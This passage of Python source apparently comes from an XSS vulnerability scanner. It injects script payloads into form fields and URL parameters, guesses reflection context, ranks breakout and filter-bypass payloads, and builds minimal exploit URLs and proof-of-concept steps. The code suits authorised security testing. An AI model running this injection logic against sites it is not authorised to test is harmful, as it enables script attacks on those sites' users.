                                                            f"Submit a comment with {website_field}={js_payload}",
                                                            f"Open: {verify_url}",
                                                            "Click the author name/link above your comment",
                                                            "Observe an alert dialog",
                                                        ],
                                                    },
                                                })
                                                log(f"STORED HREF-JS XSS FOUND: Form input {website_field}", 'VULN')
                            except Exception:
                                pass
    
    except Exception as e:
        log(f"Advanced XSS scanner error: {str(e)}", 'ERROR')
    
    # Append DOM XSS findings from static analysis and PoC generation
    try:
        dom_targets = [url]
        for cand in _discover_dom_xss_candidate_pages(url, timeout=timeout, headers=headers, max_urls=3):
            if cand not in dom_targets:
                dom_targets.append(cand)

        for dom_url in dom_targets[:4]:
            dom_vulns = test_dom_xss(dom_url, timeout=timeout, browser_verify=browser_verify)
            if dom_vulns:
                vulnerabilities.extend(dom_vulns)

            # Avoid spamming the report: once we get a concrete DOM XSS PoC, stop trying more pages.
            if any(v.get("type") == "dom_xss" for v in (dom_vulns or [])):
                break
    except Exception as e:
        log(f"DOM XSS check failed: {str(e)}", 'WARN')

    log(f"Attempted {attempted_payloads} payload injection(s)", 'INFO')

    if vulnerabilities:
        log(f"Found {len(vulnerabilities)} XSS vulnerability(ies)", 'VULN')
    else:
        log(f"No XSS vulnerabilities found", 'INFO')
    
    return vulnerabilities


def _is_in_comment(text: str, idx: int) -> bool:
    if idx < 0:
        return False
    last_open = text.rfind("<!--", 0, idx)
    last_close = text.rfind("-->", 0, idx)
    return last_open != -1 and last_open > last_close


def _is_inside_tag(text: str, idx: int, tag: str) -> bool:
    open_idx = text.rfind(f"<{tag}", 0, idx)
    if open_idx == -1:
        return False
    close_idx = text.rfind(f"</{tag}>", 0, idx)
    return close_idx < open_idx


def _is_in_attribute(text: str, payload: str) -> bool:
    attr_pattern = r'<[^>]+\s+[^\s=]+\s*=\s*["\'][^"\']*' + re.escape(payload) + r'[^"\']*["\']'
    return re.search(attr_pattern, text, re.IGNORECASE | re.DOTALL) is not None


def _guess_reflection_context(text: str, payload: str) -> str:
    idx = text.find(payload)
    if idx == -1:
        return 'unknown'
    if _is_in_comment(text, idx):
        return 'comment'
    if _is_inside_tag(text, idx, "script"):
        return 'javascript'
    if _is_inside_tag(text, idx, "style"):
        return 'css'
    if _is_in_attribute(text, payload):
        return 'attribute'
    # Basic text node check
    left = text.rfind(">", 0, idx)
    right = text.find("<", idx + len(payload))
    if left != -1 and right != -1 and left < idx < right:
        return 'html'
    return 'unknown'


def _is_reflected_unescaped(response_text: str, payload: str) -> bool:
    # If the raw payload is present anywhere, we consider it unescaped enough to analyze.
    # Some pages reflect both raw and escaped variants; rejecting on escaped presence creates false negatives.
    return payload in response_text


def is_xss_vulnerable(response_text: str, payload: str, expected_context: Optional[str] = None) -> bool:
    """
    Conservative vulnerability detection to reduce false positives.
    """
    if not _is_reflected_unescaped(response_text, payload):
        return False

    actual_context = _guess_reflection_context(response_text, payload)
    if actual_context == 'comment':
        return False

    # Context detection based on a marker can disagree with the real payload reflection context.
    # Example: marker yields "html" but the payload lands inside an attribute value.
    # We keep safety by only relaxing to closely-related contexts.
    if expected_context:
        if expected_context == 'javascript' and actual_context != 'javascript':
            # Reflections often occur in multiple contexts; do not drop an attribute-context
            # candidate just because a script-context reflection was seen first.
            if actual_context != 'attribute':
                return False
        if expected_context == 'attribute' and actual_context != 'attribute':
            return False
        if expected_context == 'css' and actual_context not in ('css', 'attribute'):
            return False
        if expected_context == 'url' and actual_context not in ('attribute', 'unknown'):
            return False
        if expected_context == 'html' and actual_context not in ('html', 'attribute', 'unknown'):
            return False
        if expected_context not in ('html', 'url', 'css', 'attribute', 'javascript') and actual_context not in (expected_context, 'unknown'):
            return False

    payload_lower = payload.lower()
    if any(keyword in payload_lower for keyword in ['<script', '</script', 'onerror', 'onload', 'onmouseover', 'onclick', 'javascript:']):
        return True
    if actual_context == 'javascript' and any(token in payload_lower for token in ['alert(', 'confirm(', 'prompt(', 'fetch(', 'document.']):
        return True
    if actual_context == 'attribute' and any(token in payload_lower for token in ['onerror', 'onload', 'onmouseover', 'onclick', 'javascript:']):
        return True
    if actual_context == 'html' and any(tag in payload_lower for tag in ['<img', '<svg', '<iframe', '<script', '</script']):
        return True

    return False


def _adaptive_prefix_variants(payload: str, context: str) -> List[str]:
    """
    Generate minimal prefix variants when reflection suggests context-breaking is needed.
    """
    if context in ('attribute', 'html'):
        return [f'\">{payload}', f"'>{payload}"]
    return []


def _prioritize_payloads_for_param(param_name: str, payloads: List[str]) -> List[str]:
    """
    Prioritize known effective payloads for high-signal parameters.
    """
    if param_name.lower() != 'search':
        return payloads
    ordered = [
        SEARCH_SVG_ANIMATION_PRIORITY_PAYLOAD,
        SEARCH_PRIORITY_PAYLOAD,
        SEARCH_ATTRIBUTE_PRIORITY_PAYLOAD,
        JSON_EVAL_BACKSLASH_BREAKOUT_PAYLOAD,
        JS_STRING_BREAKOUT_PAYLOAD,
    ]
    for payload in payloads:
        if payload not in ordered:
            ordered.append(payload)
    return ordered


def _adaptive_candidate_payloads(context: str, safe_mode: bool = True) -> List[str]:
    """
    Build a focused payload set for adaptive retries based on context.
    """
    if context in ('attribute', 'html'):
        candidates = []
        candidates.append(SEARCH_ATTRIBUTE_PRIORITY_PAYLOAD)
        candidates.extend(XSSPayloads.HTML_CONTEXT)
        candidates.extend(XSSPayloads.EVENT_HANDLERS)
        candidates.extend(XSSPayloads.ATTRIBUTE_BASED)
        if not safe_mode:
            candidates.extend(XSSPayloads.FILTER_BYPASS)
        # Deduplicate while preserving order
        seen = set()
        ordered = []
        for p in candidates:
            if p not in seen:
                seen.add(p)
                ordered.append(p)
        return ordered
    if context == 'javascript':
        candidates = [JSON_EVAL_BACKSLASH_BREAKOUT_PAYLOAD, JS_STRING_BREAKOUT_PAYLOAD]
        candidates.extend(XSSPayloads.JAVASCRIPT_CONTEXT)
        seen = set()
        ordered = []
        for p in candidates:
            if p not in seen:
                seen.add(p)
                ordered.append(p)
        return ordered
    return []


def _short_payload(p: str, limit: int = 120) -> str:
    if p is None:
        return ""
    p = str(p)
    if len(p) <= limit:
        return p
    return p[:limit] + "..."


def _should_browser_verify_param(param_name: str) -> bool:
    pl = (param_name or '').lower()
    return pl in ('search', 'q', 'query', 'keyword', 'term')


def _build_minimal_get_exploit_url(original_url: str, base_url: str, param_name: str, payload: str) -> str:
    """
    Build a minimal exploit URL:
    - preserve only the *original* query params from the user-supplied URL
    - inject/override the vulnerable parameter
    - avoid extra "test" parameters added by our harvesting/discovery logic
    """
    try:
        parsed = urllib.parse.urlparse(original_url)
        baseline = urllib.parse.parse_qs(parsed.query)
    except Exception:
        baseline = {}

    baseline[param_name] = [payload]
    query = urllib.parse.urlencode(baseline, doseq=True)
    return f"{base_url}?{query}" if query else base_url
